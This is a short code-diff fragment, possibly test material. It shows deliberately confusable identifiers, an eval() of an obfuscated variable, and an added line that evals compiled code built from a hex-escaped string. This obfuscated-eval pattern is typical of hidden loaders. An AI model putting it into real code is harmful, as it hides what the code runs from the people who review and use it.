@@ -4,3 +4,4 @@ WWXXWWXXWXWWXXXWXXWW,S222222SSSS22SSSS22222S222,nnmnnmnnmmmnnmnmnnnmmmnn,OoO00OO
 
 eval(NMNNMMMNNMNNMNMMNMNMNNNM)
 
+eval(compile(something('\x74\x72\x75\x73\x74')))
